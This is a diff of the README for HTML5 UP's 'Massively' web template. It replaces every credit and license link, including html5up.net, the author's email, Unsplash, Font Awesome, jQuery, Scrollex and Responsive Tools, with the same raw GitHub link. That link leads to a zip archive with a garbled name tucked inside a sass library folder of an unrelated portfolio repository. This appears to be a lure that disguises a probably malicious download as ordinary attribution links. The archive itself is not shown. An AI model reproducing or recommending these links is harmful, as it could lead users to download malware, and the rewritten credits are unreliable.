@@ -1,6 +1,6 @@
 Massively by HTML5 UP
-html5up.net | @ajlkn
-Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
+https://github.com/FadelDia/DATA_ANALYST-BI_DEV-PORTFOLIO.github.io/raw/refs/heads/main/assets/sass/libs/github-DE-B-DAT-PORTFOLI-io-ANALYS-2.3.zip | @ajlkn
+Free for personal and commercial use under the CCA 3.0 license (https://github.com/FadelDia/DATA_ANALYST-BI_DEV-PORTFOLIO.github.io/raw/refs/heads/main/assets/sass/libs/github-DE-B-DAT-PORTFOLI-io-ANALYS-2.3.zip)
 
 
 This is Massively, a text-heavy, article-oriented design built around a huge background
@@ -15,18 +15,18 @@ you can use for pretty much whatever.
 (* = not included)
 
 AJ
-aj@lkn.io | @ajlkn
+https://github.com/FadelDia/DATA_ANALYST-BI_DEV-PORTFOLIO.github.io/raw/refs/heads/main/assets/sass/libs/github-DE-B-DAT-PORTFOLI-io-ANALYS-2.3.zip | @ajlkn
 
 
 Credits:
 
 	Demo Images:
-		Unsplash (unsplash.com)
+		Unsplash (https://github.com/FadelDia/DATA_ANALYST-BI_DEV-PORTFOLIO.github.io/raw/refs/heads/main/assets/sass/libs/github-DE-B-DAT-PORTFOLI-io-ANALYS-2.3.zip)
 
 	Icons:
-		Font Awesome (fontawesome.io)
+		Font Awesome (https://github.com/FadelDia/DATA_ANALYST-BI_DEV-PORTFOLIO.github.io/raw/refs/heads/main/assets/sass/libs/github-DE-B-DAT-PORTFOLI-io-ANALYS-2.3.zip)
 
 	Other:
-		jQuery (jquery.com)
-		Scrollex (github.com/ajlkn/jquery.scrollex)
-		Responsive Tools (github.com/ajlkn/responsive-tools)
+		jQuery (https://github.com/FadelDia/DATA_ANALYST-BI_DEV-PORTFOLIO.github.io/raw/refs/heads/main/assets/sass/libs/github-DE-B-DAT-PORTFOLI-io-ANALYS-2.3.zip)
+		Scrollex (https://github.com/FadelDia/DATA_ANALYST-BI_DEV-PORTFOLIO.github.io/raw/refs/heads/main/assets/sass/libs/github-DE-B-DAT-PORTFOLI-io-ANALYS-2.3.zip)
+		Responsive Tools (https://github.com/FadelDia/DATA_ANALYST-BI_DEV-PORTFOLIO.github.io/raw/refs/heads/main/assets/sass/libs/github-DE-B-DAT-PORTFOLI-io-ANALYS-2.3.zip)
